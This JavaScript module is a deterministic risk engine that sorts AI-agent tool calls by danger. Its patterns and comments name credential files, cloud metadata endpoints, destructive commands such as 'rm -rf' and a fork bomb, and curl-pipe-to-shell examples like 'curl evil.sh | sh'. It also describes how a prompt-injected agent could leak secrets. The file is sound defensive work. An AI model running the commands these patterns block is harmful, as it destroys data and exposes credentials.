/**
 * The risk engine.
 *
 * Classifies a normalized tool call as LOW, MEDIUM, HIGH, or CRITICAL before
 * policy runs, so a rule can say `risk >= HIGH` instead of enumerating every
 * dangerous tool name that will ever exist.
 *
 * DELIBERATELY NOT A MODEL.
 *
 * The obvious version of this is a small classifier. It is the wrong shape for
 * the job for three reasons, and the reasons are worth stating because the
 * temptation returns every quarter:
 *
 *   1. A risk score that changes between two identical calls makes every
 *      downstream artifact — the audit record, the replay, the approval — a
 *      claim nobody can reproduce. `cirvix replay` is only meaningful if the
 *      same input yields the same classification a year later.
 *   2. A classifier is an inference dependency on the hot path. This runs
 *      before every tool call on a developer's laptop.
 *   3. It is an attacker-controlled input path. The arguments come from a model
 *      that may be reading a hostile web page; feeding them to a second model
 *      to decide how dangerous they are just moves the injection one hop.
 *
 * So: ordered, explicit rules over a normalized call. Most severe match wins,
 * and the matching rule's name is returned alongside the level, because a risk
 * level an operator cannot trace back to a reason is a number they will learn
 * to ignore.
 *
 * WHAT A LEVEL MEANS
 *
 * The level is an input to policy, never a decision by itself. The mapping in
 * `DEFAULT_POSTURE` (LOW allow / MEDIUM policy / HIGH approval / CRITICAL deny)
 * is what applies when no rule matches at all — it is a floor, not an override.
 * A policy that explicitly permits a CRITICAL call wins, because the operator
 * who wrote that rule knew something this table cannot.
 */

/** @typedef {"low"|"medium"|"high"|"critical"} RiskLevel */

export const RISK = {
  LOW: "low",
  MEDIUM: "medium",
  HIGH: "high",
  CRITICAL: "critical",
};

/** Ordered least → most severe. Used for `risk >= HIGH` comparisons. */
export const RISK_ORDER = [RISK.LOW, RISK.MEDIUM, RISK.HIGH, RISK.CRITICAL];

export function riskRank(level) {
  const i = RISK_ORDER.indexOf(String(level ?? "").toLowerCase());
  return i === -1 ? 0 : i;
}

/** True when `level` is at least `floor`. Unknown levels rank lowest. */
export function riskAtLeast(level, floor) {
  return riskRank(level) >= riskRank(floor);
}

export function maxRisk(a, b) {
  return riskRank(a) >= riskRank(b) ? a : b;
}

/**
 * The default posture per level — what happens with no matching policy rule.
 *
 * MEDIUM maps to `policy`, which is not a decision: it means "the rule set
 * decides, and default-deny applies if it does not". Encoding it as ALLOW here
 * would quietly make the risk table a permissive layer sitting above the policy
 * engine, which is exactly backwards.
 */
export const DEFAULT_POSTURE = {
  [RISK.LOW]: "allow",
  [RISK.MEDIUM]: "policy",
  [RISK.HIGH]: "require_approval",
  [RISK.CRITICAL]: "deny",
};

/* -------------------------------------------------------------------------- */
/*  Signals                                                                    */
/* -------------------------------------------------------------------------- */

/**
 * Paths whose contents are credentials. Matched against the canonicalized
 * resource, so `~/x/../.aws/credentials` and an absolute path are one thing.
 */
const CREDENTIAL_PATHS = [
  /(^|[/\\])\.env(\.|$)/i,
  /(^|[/\\])\.aws([/\\]|$)/i,
  /(^|[/\\])\.ssh([/\\]|$)/i,
  /(^|[/\\])\.kube([/\\]config)?$/i,
  /(^|[/\\])\.npmrc$/i,
  /(^|[/\\])\.netrc$/i,
  /(^|[/\\])\.docker[/\\]config\.json$/i,
  /(^|[/\\])\.gnupg([/\\]|$)/i,
  /(^|[/\\])id_(rsa|dsa|ecdsa|ed25519)$/i,
  /(^|[/\\])credentials$/i,
  /(^|[/\\])\.pgpass$/i,
  /(^|[/\\])service[-_]?account.*\.json$/i,
  /\.(pem|pfx|p12|key|keystore|jks)$/i,
  /(^|[/\\])\.git-credentials$/i,
  /(^|[/\\])\.terraformrc$/i,
  /(^|[/\\])terraform\.tfstate$/i,
];

/**
 * Cloud instance-metadata endpoints — the SSRF target that turns a web-fetch
 * tool into a cloud credential. 169.254.169.254 is the canonical one; the
 * others are the same idea on other providers, and `metadata.google.internal`
 * resolves to the same link-local address.
 */
const METADATA_HOSTS = [
  /^169\.254\.169\.254$/,
  /^metadata\.google\.internal$/i,
  /^metadata\.goog$/i,
  /^100\.100\.100\.200$/, // Alibaba
  /^169\.254\.170\.2$/, // ECS task metadata
  /^fd00:ec2::254$/i,
];

/** Shell fragments that destroy state rather than inspect it. */
const DESTRUCTIVE_COMMANDS = [
  /\brm\s+(-[a-z]*[rf][a-z]*\s+)+/i,
  /\brmdir\s+\/s/i,
  /\bdel\s+\/[fsq]/i,
  /\bmkfs\b/i,
  /\bdd\s+.*\bof=\/dev\//i,
  /\bshred\b/i,
  /:\(\)\s*\{\s*:\|:&\s*\}\s*;:/, // fork bomb
  /\bchmod\s+-R\s+777\b/i,
  /\bgit\s+push\s+.*--force/i,
  /\bgit\s+reset\s+--hard/i,
  /\bdrop\s+(table|database|schema)\b/i,
  /\btruncate\s+table\b/i,
  /\bhistory\s+-c\b/i,
  />\s*\/dev\/sd[a-z]/i,
];

/** Package managers executing arbitrary install-time scripts. */
const INSTALL_COMMANDS =
  /\b(npm|pnpm|yarn|bun)\s+(i|install|add)\b|\bpip3?\s+install\b|\bgem\s+install\b|\bcargo\s+install\b|\bgo\s+install\b|\bapt(-get)?\s+install\b|\bbrew\s+install\b|\bchoco\s+install\b/i;

/**
 * Curl-pipe-to-shell and friends: remote code, executed immediately.
 *
 * The PowerShell arm is separate because its shell is not spelled `sh`.
 * `iwr … | iex` is the exact Windows equivalent of `curl … | sh`, and an
 * earlier version of this pattern required a literal `sh` after the pipe — so
 * the canonical Windows attack scored HIGH instead of CRITICAL and was held for
 * approval rather than denied. The adversarial corpus caught it.
 */
const REMOTE_EXEC =
  /\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|irm)\b[^|;]*[|;]\s*(sudo\s+)?((ba|z|k|fi)?sh|iex|invoke-expression|python3?|node|perl|ruby)\b|\biex\s*[(\s]|\|\s*Invoke-Expression/i;

/** Production identifiers in a resource, a target, or an environment field. */
const PRODUCTION_MARKERS =
  /\b(prod|production|live)\b|(^|[-_.])prd([-_.]|$)/i;

const SHELL_ACTIONS = new Set(["shell.exec", "process.spawn"]);
const WRITE_ACTIONS = new Set(["fs.write", "fs.delete", "fs.move", "fs.chmod"]);
const READ_ACTIONS = new Set(["fs.read", "fs.list", "fs.stat", "fs.search"]);

/** Read-only VCS and inspection tools — the LOW baseline in the blueprint. */
const READ_ONLY_TOOLS =
  /^(git[._-])?(status|log|diff|show|branch|blame|remote|ls[-_]?files|rev[-_]?parse)$|^(read|get|list|stat|search|find|grep|head|tail|cat|query|describe|inspect|explain|ping|health|version|whoami)$/i;

/**
 * Shell metacharacters that chain, redirect, or substitute.
 *
 * The allowlist below is only sound because of this check. `npm test` is a safe
 * command; `npm test; curl evil.sh | sh` starts with the same eight characters
 * and is not. Any command containing one of these is disqualified from the
 * allowlist outright and falls back to HIGH — a shell allowlist that can be
 * suffixed is not an allowlist, it is a prefix that grants arbitrary execution.
 */
const SHELL_METACHARACTERS = /[;&|`$><\n\r]|\$\(|\|\||&&/;

/**
 * Commands whose whole job is to inspect or build, matched in full.
 *
 * Anchored, argument-aware, and deliberately short. Every entry here is a
 * command that a developer runs dozens of times an hour and that cannot, on its
 * own, reach outside the project. This is the difference between a control
 * plane a team keeps switched on and one that asks for approval so often it
 * gets disabled in week one.
 *
 * It lowers a command from HIGH to MEDIUM. It never lowers anything to LOW, and
 * it never overrides the destructive, remote-execution, or privilege rules —
 * those are separate entries evaluated independently, and most-severe wins.
 */
const KNOWN_SAFE_COMMANDS = [
  /^(npm|pnpm|yarn|bun)\s+(test|run\s+[\w:.-]+|ci|ls|list|outdated|why|audit)\s*[\w:.=@/-]*$/i,
  /^(pytest|tox|nox)(\s+[\w./:=-]+)*$/i,
  /^python3?\s+-m\s+(pytest|unittest|mypy|ruff|black)(\s+[\w./:=-]+)*$/i,
  /^(cargo|go)\s+(test|build|check|vet|fmt|clippy)(\s+[\w./:=-]+)*$/i,
  /^(mvn|gradle|gradlew)\s+(test|build|compile|verify)$/i,
  /^(make|just)\s+[\w:.-]+$/i,
  /^git\s+(status|log|diff|show|branch|blame|remote|fetch|rev-parse|ls-files|describe|stash\s+list)(\s+[\w./:=@^~-]+)*$/i,
  /^(ls|dir|pwd|whoami|hostname|date|uname|env|printenv|which|where|node|npm|python3?|go|cargo)\s*(--?[\w-]+)*$/i,
  /^(cat|head|tail|wc|file|stat)\s+[\w./-]+$/i,
  /^(tsc|eslint|prettier|ruff|black|mypy|jest|vitest|mocha)(\s+[\w./:=@*-]+)*$/i,
  /^docker\s+(ps|images|logs|inspect|version|info)(\s+[\w./:-]+)*$/i,
  /^kubectl\s+(get|describe|logs|top|version)(\s+[\w./:-]+)*$/i,
];

/**
 * True when a command is on the allowlist AND cannot have been extended.
 *
 * Both halves are load-bearing. Order matters too: the metacharacter check runs
 * first so a crafted command never even reaches the patterns.
 */
export function isKnownSafeCommand(command) {
  if (typeof command !== "string" || !command) return false;
  const trimmed = command.trim();
  if (SHELL_METACHARACTERS.test(trimmed)) return false;
  if (trimmed.length > 200) return false;
  return KNOWN_SAFE_COMMANDS.some((re) => re.test(trimmed));
}

/**
 * True when a command is a recognised package install and nothing else.
 *
 * `package-install` classifies these MEDIUM — installing third-party code that
 * may run install-time scripts. But `shell-execution` also fired on them, and
 * most-severe-wins meant every install scored HIGH, so the MEDIUM rule could
 * never be the answer for the case it was written for.
 *
 * Recognising the shape is what makes it not-arbitrary execution. The same
 * metacharacter guard applies, so `npm install; rm -rf /` is not downgraded —
 * without that, this is a bypass rather than a classification.
 */
export function isRecognizedInstall(command) {
  if (typeof command !== "string" || !command) return false;
  const trimmed = command.trim();
  if (SHELL_METACHARACTERS.test(trimmed)) return false;
  if (trimmed.length > 200) return false;
  return INSTALL_COMMANDS.test(trimmed);
}

/* -------------------------------------------------------------------------- */
/*  Rules                                                                      */
/* -------------------------------------------------------------------------- */

/**
 * Each rule is `{ id, level, when(call) -> boolean, why }`.
 *
 * Evaluated in full — not short-circuited — so the classification carries every
 * signal that fired, not just the first. An operator triaging a CRITICAL wants
 * to know it was *both* a credential path *and* an external egress, because
 * that pair is a different incident from either alone.
 */
export const RISK_RULES = [
  /* ---------------------------------------------------------------- CRITICAL */
  {
    id: "credential-access",
    level: RISK.CRITICAL,
    why: "Reads material that authenticates as somebody. A single successful read is an irreversible disclosure.",
    /**
     * Checks the command as well as the resource.
     *
     * `cat ~/.aws/credentials` is a shell call, so its resource is empty — the
     * credential path is inside the command string. Checking only the resource
     * meant the file-read path was CRITICAL and the identical read through a
     * shell was merely HIGH, which is a hole an agent finds by accident on its
     * first retry. Found by the adversarial corpus.
     */
    when: (c) =>
      CREDENTIAL_PATHS.some((re) => re.test(c.resource ?? "")) ||
      CREDENTIAL_PATHS.some((re) => re.test(c.command ?? "")),
  },
  {
    id: "cloud-metadata-request",
    level: RISK.CRITICAL,
    why: "Targets a cloud instance-metadata endpoint, which returns live role credentials to anything that can reach it.",
    when: (c) => {
      const host = hostOf(c.destination ?? c.resource);
      return Boolean(host) && METADATA_HOSTS.some((re) => re.test(host));
    },
  },
  {
    id: "production-deployment",
    level: RISK.CRITICAL,
    why: "Changes what is serving live traffic. The blast radius is every user, and rollback is not instant.",
    when: (c) =>
      (c.action === "k8s.apply" ||
        /\b(deploy|rollout|apply|release|promote|terraform\s+apply|helm\s+(install|upgrade))\b/i.test(
          `${c.tool ?? ""} ${c.command ?? ""}`,
        )) &&
      (PRODUCTION_MARKERS.test(c.environment ?? "") ||
        PRODUCTION_MARKERS.test(c.resource ?? "") ||
        PRODUCTION_MARKERS.test(c.command ?? "")),
  },
  {
    id: "destructive-command",
    level: RISK.CRITICAL,
    why: "Command matches a pattern that destroys data or history rather than changing it.",
    when: (c) => DESTRUCTIVE_COMMANDS.some((re) => re.test(c.command ?? "")),
  },
  {
    id: "remote-code-execution",
    level: RISK.CRITICAL,
    why: "Downloads code and executes it in one step, so nothing between the network and the shell ever inspects it.",
    when: (c) => REMOTE_EXEC.test(c.command ?? ""),
  },
  {
    id: "secret-material-in-arguments",
    level: RISK.CRITICAL,
    why: "The arguments already contain live credential material, so this call would put a secret on the wire.",
    when: (c) => c.secretsDetected > 0 && c.egress === "external",
  },

  /* -------------------------------------------------------------------- HIGH */
  {
    id: "shell-execution",
    level: RISK.HIGH,
    why: "Arbitrary command execution. Whatever the policy says about individual tools, a shell can reach past all of them.",
    when: (c) =>
      (SHELL_ACTIONS.has(c.action) || Boolean(c.command)) &&
      !isKnownSafeCommand(c.command) &&
      !isRecognizedInstall(c.command),
  },
  {
    id: "database-write",
    level: RISK.HIGH,
    why: "Mutates persistent state that other systems read. Usually recoverable, never for free.",
    when: (c) =>
      c.action === "db.write" ||
      c.action === "db.migrate" ||
      /\b(insert|update|delete|upsert|merge|alter|create)\s+/i.test(c.sql ?? ""),
  },
  {
    id: "external-egress",
    level: RISK.HIGH,
    why: "Sends data to a destination outside the workspace and outside your network.",
    when: (c) => c.egress === "external",
  },
  {
    id: "workspace-escape",
    level: RISK.HIGH,
    why: "The resolved path is outside the workspace root, so the workspace boundary is not containing this call.",
    when: (c) => c.insideWorkspace === false,
  },
  {
    id: "session-tainted-egress",
    level: RISK.HIGH,
    why: "This session already read secret-shaped material, which makes any outbound call an exfiltration path.",
    when: (c) => c.touchedSecret === true && c.egress !== "none",
  },
  {
    id: "privilege-escalation",
    level: RISK.HIGH,
    why: "Runs with elevated privilege, so the workspace and file-permission boundaries stop applying.",
    when: (c) => /\b(sudo|doas|runas|su\s+-)\b/i.test(c.command ?? ""),
  },

  /* ------------------------------------------------------------------ MEDIUM */
  {
    id: "shell-execution-known-safe",
    level: RISK.MEDIUM,
    why: "A recognised build or inspection command with no shell metacharacters. Still execution, so never LOW.",
    when: (c) => (SHELL_ACTIONS.has(c.action) || Boolean(c.command)) && isKnownSafeCommand(c.command),
  },
  {
    id: "package-install",
    level: RISK.MEDIUM,
    why: "Installs third-party code that may run install-time scripts with your permissions.",
    when: (c) => isRecognizedInstall(c.command) || c.action === "pkg.install",
  },
  {
    id: "source-modification",
    level: RISK.MEDIUM,
    why: "Modifies files in the workspace. Reviewable and revertible, which is what keeps it below HIGH.",
    when: (c) => WRITE_ACTIONS.has(c.action),
  },
  {
    id: "config-modification",
    level: RISK.MEDIUM,
    why: "Writes agent or tooling configuration, which changes what future runs are allowed to do.",
    when: (c) =>
      WRITE_ACTIONS.has(c.action) &&
      /(mcp\.json|settings\.json|\.cursorrules|CLAUDE\.md|AGENTS\.md|\.claude[/\\]|cirvix\.policy)/i.test(
        c.resource ?? "",
      ),
  },
  {
    id: "internal-egress",
    level: RISK.MEDIUM,
    why: "Reaches a host on the local network. Not the public internet, but not the workspace either.",
    when: (c) => c.egress === "internal",
  },

  /* --------------------------------------------------------------------- LOW */
  {
    id: "read-only-tool",
    level: RISK.LOW,
    why: "Inspects state without changing it.",
    when: (c) =>
      READ_ACTIONS.has(c.action) ||
      READ_ONLY_TOOLS.test(String(c.tool ?? "")) ||
      /^git[._ -](status|log|diff|show|branch)$/i.test(`${c.tool ?? ""}`),
  },
];

/* -------------------------------------------------------------------------- */
/*  Classification                                                             */
/* -------------------------------------------------------------------------- */

function hostOf(value) {
  if (typeof value !== "string" || !value) return null;
  try {
    if (/^[a-z][a-z0-9+.-]*:\/\//i.test(value)) return new URL(value).hostname.toLowerCase();
  } catch {
    return null;
  }
  // A bare host:port or bare host, which is how a socket-shaped tool names one.
  const bare = value.match(/^([a-z0-9._-]+|\[[0-9a-f:]+\])(?::\d+)?$/i);
  return bare ? bare[1].replace(/^\[|\]$/g, "").toLowerCase() : null;
}

/**
 * Classify one call.
 *
 * Accepts a normalized call (see `normalize.mjs`) or a loose object with any of
 * `action`, `tool`, `resource`, `command`, `sql`, `destination`, `environment`,
 * `egress`, `insideWorkspace`, `touchedSecret`, `secretsDetected`. Missing
 * fields simply do not fire their rules — classification degrades toward the
 * baseline rather than throwing, because a call it cannot read is still a call
 * it must return a level for.
 *
 * @returns {{level: RiskLevel, rank: number, posture: string, signals: Array<{id:string,level:RiskLevel,why:string}>, reason: string}}
 */
export function classify(call = {}) {
  const c = {
    action: call.action ?? null,
    tool: call.tool ?? null,
    resource: call.resource ?? "",
    command: commandOf(call),
    sql: call.sql ?? call.arguments?.sql ?? call.arguments?.query ?? null,
    destination: call.destination ?? null,
    environment: call.environment ?? call.context?.environment ?? "local",
    egress: call.egress ?? egressOf(call),
    insideWorkspace: call.insideWorkspace ?? call.context?.path?.insideWorkspace ?? true,
    touchedSecret: call.touchedSecret ?? call.context?.session?.touchedSecret ?? false,
    secretsDetected: call.secretsDetected ?? 0,
  };

  const signals = [];
  for (const rule of RISK_RULES) {
    let fired = false;
    try {
      fired = Boolean(rule.when(c));
    } catch {
      // A rule that throws on a shape it did not expect must not take down the
      // decision path. It contributes nothing and the others still run.
      fired = false;
    }
    if (fired) signals.push({ id: rule.id, level: rule.level, why: rule.why });
  }

  // Most severe wins. An unrecognised call with no signals at all is MEDIUM,
  // not LOW: "we could not tell" and "we determined it is safe" are different
  // statements, and only one of them should skip review.
  const level = signals.reduce((acc, s) => maxRisk(acc, s.level), signals.length ? RISK.LOW : RISK.MEDIUM);
  const top = signals.filter((s) => s.level === level);

  return {
    level,
    rank: riskRank(level),
    posture: DEFAULT_POSTURE[level],
    signals,
    reason: top.length
      ? top.map((s) => s.why).join(" ")
      : "No risk signal matched this call, so it is treated as MEDIUM rather than assumed safe.",
  };
}

/** Pulls the shell command out of whichever argument shape the tool used. */
function commandOf(call) {
  if (typeof call.command === "string" && call.command) return call.command;
  const args = call.arguments ?? call.args ?? null;
  if (!args || typeof args !== "object") return null;
  for (const key of ["command", "cmd", "script", "shell", "exec", "run"]) {
    const v = args[key];
    if (typeof v === "string" && v) return v;
    // `["bash", "-c", "rm -rf /"]` — the dangerous part is an array element.
    if (Array.isArray(v) && v.every((x) => typeof x === "string")) return v.join(" ");
  }
  return null;
}

/** "none" | "internal" | "external" from whatever the call names. */
function egressOf(call) {
  const target = call.destination ?? call.resource ?? "";
  if (!/^https?:\/\//i.test(target)) return "none";
  const host = hostOf(target);
  if (!host) return "external";
  if (/^(localhost|127\.|0\.0\.0\.0|::1|\[?::1\]?)/i.test(host)) return "none";
  if (/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.)/.test(host)) return "internal";
  if (/\.(internal|local|localdomain|test|invalid)$/i.test(host)) return "internal";
  return "external";
}

/**
 * Renders the level for a terminal. Kept here so every surface — CLI, demo,
 * logs — spells and pads it identically.
 */
export function riskLabel(level) {
  return String(level ?? "unknown").toUpperCase();
}
